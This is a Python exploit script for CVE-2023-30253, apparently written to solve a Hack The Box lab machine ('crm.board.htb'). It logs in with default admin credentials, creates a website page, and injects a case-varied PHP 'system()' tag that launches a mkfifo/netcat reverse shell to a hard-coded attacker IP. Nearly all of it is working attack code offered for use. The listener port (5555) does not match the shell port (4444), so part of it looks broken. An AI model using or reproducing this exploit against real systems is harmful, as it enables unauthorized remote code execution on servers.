import requests
from bs4 import BeautifulSoup
from datetime import datetime
import re
from pwn import *
from colorama import init, Fore, Style


init()


context.log_level = 'info'

class CVE_2023_30253:
    
    def __init__(self,url,user,password):
        self.session = requests.Session()
        self.url=url
        self.user = user
        self.password= password
        self.token=""
        self.headers = {
                "Origin": url,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; rv:122.0) Gecko/20100101 Firefox/122.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Referer": url,
            }
        
    def get_token_CSRF(self,url):
        try:
            response = self.session.get(url)
        
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token = soup.find('meta', attrs={'name': 'anti-csrf-newtoken'})
            if csrf_token:
                return csrf_token.get('content')
            else:
                return None

        except Exception as e:
            log.error(f"{Fore.RED}get_token_CSRF Error: {e}{Style.RESET_ALL}")
            return None 
            
    def login(self):
        
        try:            
            url = f"{self.url}/admin/index.php"
            self.token =self.get_token_CSRF(url)

            data = {
                "token": self.token,
                "actionlogin": "login",
                "loginfunction": "loginfunction",
                "backtopage": "",
                "tz": "-6",
                "tz_string": "America/Mexico_City",
                "dst_observed": "0",
                "dst_first": "",
                "dst_second": "",
                "screenwidth": "628",
                "screenheight": "608",
                "dol_hide_topmenu": "",
                "dol_hide_leftmenu": "",
                "dol_optimize_smallscreen": "",
                "dol_no_mouse_hover": "",
                "dol_use_jmobile": "",
                "username": self.user,
                "password": self.password
            }

            response = self.session.post(url, headers=self.headers, data=data)

            if(response.status_code == 200):
                if not "Bad value for login or password" in response.text:
                    return True 
                else:
                    log.error(f"{Fore.RED}[-] Login failed.{Style.RESET_ALL}")
            else:
                log.error(f"{Fore.RED}[-] Error in the request\nAborting..{Style.RESET_ALL}")
                exit(1)
            
            return False 
            
        except Exception as e:
            log.error(f"{Fore.RED}login Error:{e}{Style.RESET_ALL}")

    def create_website(self):
        url = f"{self.url}/website/index.php"
        website_ref="test123"
        self.session.headers.update({
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0TYAB8bzZ1DiVwez"
        })
        log.info(self.token)
        try:
            data = {
                "token": self.token,
                "backtopage": "",
                "dol_openinpopup": "",
                "action": "addsite",
                "website": "-1",
                "WEBSITE_REF": website_ref,
                "WEBSITE_LANG": "en",
                "WEBSITE_OTHERLANG": "",
                "WEBSITE_DESCRIPTION": "test",
                "virtualhost": "http://localhost",
                "addcontainer": "Create"
            }
            
            response = self.session.post(url, data=data,headers=self.headers)
            #print(response.text)
            if response.status_code == 200:
                if website_ref in response.text:
                    log.info(f"{Fore.GREEN}[+] WEB SITE WAS CREATE SUCCESSFULLY!{Style.RESET_ALL}")
                    return True
                
            else:
                log.error(f"{Fore.RED}[-] SOME ERROR WAS FOUND CREATING THE WEB SITE..{Style.RESET_ALL}")
        except Exception as e:
            log.error(f"{Fore.RED}create_website error {e}{Style.RESET_ALL}")

        return False 

    def create_page(self):
        website="test123"
        url = f"{self.url}/website/index.php"
        self.session.headers.update({
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNy4GtqU6jty4Aoi4"
        })
        now = datetime.now()
        date_creation = now.strftime("%m/%d/%Y %H:%M:%S")
        data = {
            "token": self.token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "addcontainer",
            "website": website,
            "pageidbis": "-1",
            "pageid": "1",
            "radiocreatefrom": "checkboxcreatemanually",
            "WEBSITE_TYPE_CONTAINER": "page",
            "sample": "empty",
            "WEBSITE_TITLE": "test",
            "WEBSITE_PAGENAME": "test",
            "WEBSITE_LANG": "en",
            "datecreation": date_creation,
            "datecreationday": now.day,
            "datecreationmonth": now.month,
            "datecreationyear": now.year,
            "datecreationhour": now.hour,
            "datecreationmin": now.minute,
            "datecreationsec": now.second,
            "addcontainer": "Create",
            "externalurl": "",
            "grabimages": "1",
            "grabimagesinto": "root"
        }
        response = self.session.post(url, data=data,headers=self.headers)
        if response.status_code == 200:
                if website in response.text:
                    log.info(f"{Fore.GREEN}[+] WEB PAGE WAS CREATE SUCCESSFULLY!{Style.RESET_ALL}")
                    return True
                
        else:
                log.error(f"{Fore.RED}[-] SOME ERROR WAS FOUND CREATING THE WEB PAGE..{Style.RESET_ALL}")
                exit(1)
        
        return False        

    def generate_payload(self, payload ):
        
        page_content=f'''<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable="true" if you want to use the inline editor for the content  -->
<section id="mysection1" contenteditable="true">
    <?PHP system("{payload}"); ?>
</section>'''
        url = f"{self.url}/website/index.php"
        response = self.session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        pageid_link = soup.find('a', href=re.compile(r'pageid=(\d+)'))
        
        if pageid_link:
            pageid_match = re.search(r'pageid=(\d+)', pageid_link['href'])
            if pageid_match:
                pageid = pageid_match.group(1)
        data = {
            "token": self.token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "updatesource",
            "website": "test",
            "pageid": pageid,
            "update": "Save",
            "PAGE_CONTENT_x": "8",
            "PAGE_CONTENT_y": "2",
            "PAGE_CONTENT": page_content
        }
        log.info(f"{Fore.GREEN}[+]Execute exploit :){Style.RESET_ALL}")
        response = self.session.post(url, data=data,headers=self.headers)
        self.session.post(url, data=data,headers=self.headers)
        if(response.status_code == 302):
            self.session.get(url,headers=self.headers)
        
def get_reverse_shell(ip,port):
    payload=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
    url="http://crm.board.htb"
    user="admin"
    password="admin"
    cve_2023_30253 = CVE_2023_30253(url,user,password)
    if(cve_2023_30253.login()):
        log.info(f"{Fore.GREEN}[+] LOGIN SUCCESSFULLY!..{Style.RESET_ALL}")
        if(cve_2023_30253.create_website()):
            if(cve_2023_30253.create_page()):
                cve_2023_30253.generate_payload(payload)

    else:
        log.error(f"{Fore.RED}[-] Error in the request\nAborting..{Style.RESET_ALL}")
            
def main():
    try:
        threading.Thread(target=get_reverse_shell, args=("10.10.14.17",4444)).start()
    except Exception as e:
            log.error(f"{Fore.RED}{str(e)}{Style.RESET_ALL}")
    
    
    
if __name__ == '__main__':
    main()

    shell = listen(5555, timeout=20).wait_for_connection()
    shell.interactive()

